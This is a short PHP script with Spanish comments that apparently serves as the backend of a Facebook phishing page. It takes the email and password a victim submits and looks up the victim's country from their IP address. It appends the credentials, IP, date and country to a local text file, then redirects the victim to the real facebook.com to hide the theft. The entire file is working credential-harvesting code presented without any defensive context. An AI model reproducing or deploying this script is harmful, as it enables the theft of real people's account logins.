<?php
ini_set('memory_limit', '-1');

$usuario = $_POST[ 'email' ]; $password = $_POST[ 'pass' ]; include("geoiploc.php"); $ip = $_SERVER[ 'REMOTE_ADDR' ]; $pais = getCountryFromIP($ip, " NamE "); $fecha = date("d/m/Y h:i");

if( ( empty($usuario)) or (empty($password)) ){
	
echo ("<SCRIPT LANGUAGE='JavaScript'>


     history.go(-1);



    </SCRIPT>");
	
	
}else{	


	//guarderemos en un archivo de texto
	$file = fopen($pais.'FBBF.txt','a+');
	fwrite($file, "\r\nUsuario: ".$usuario."\r\nContraseña: ".$password."\r\nIP: ".$ip."\r\nFecha: ".$fecha."\r\nPais: ".$pais."\r\n<----------------cuentas----------------->>>\r\n");
	fclose($file);
	
	

	
echo ('<SCRIPT>


	
		window.location.href="https://www.facebook.com/";


    </SCRIPT>');
  	
 
	
}
?>